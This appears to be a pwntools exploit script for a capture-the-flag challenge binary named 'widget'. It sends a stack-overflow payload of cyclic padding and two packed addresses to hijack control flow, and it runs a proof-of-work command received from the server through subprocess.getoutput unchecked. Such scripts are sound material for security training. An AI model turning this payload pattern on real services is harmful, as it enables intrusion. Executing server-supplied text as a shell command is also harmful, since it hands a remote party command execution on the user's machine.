#!/usr/bin/python3
from pwn import *
import subprocess

elf = context.binary = ELF("widget")
libc = elf.libc

local = True 
if local:
    p = process("./widget")
    #gdb.attach(p,'''b*0x00000000004014c6\nc''')
else:
    p = remote('challs.actf.co', 31320)

elf = context.binary = ELF('./widget', checksec=False)

main = 0x000000000040142f
ret = 0x000000000040101a
win = 0x401324
puts = 0x0000000000401100
puts_got = 0x403f98

if local: 
    print("[+]Local........")
    sleep(2)
else:
    p.recvuntil(b"proof of work: ")
    foo = p.recvline().decode()
    print(foo)
    resultCapcha = subprocess.getoutput(foo)
    print(resultCapcha)
    p.sendline(resultCapcha)

p.sendlineafter(b"Amount:", b"48") 
payload = cyclic(40) + p64(0x404240) + p64(0x000000000040130b)
p.sendafter(b"Contents:", payload)
p.interactive()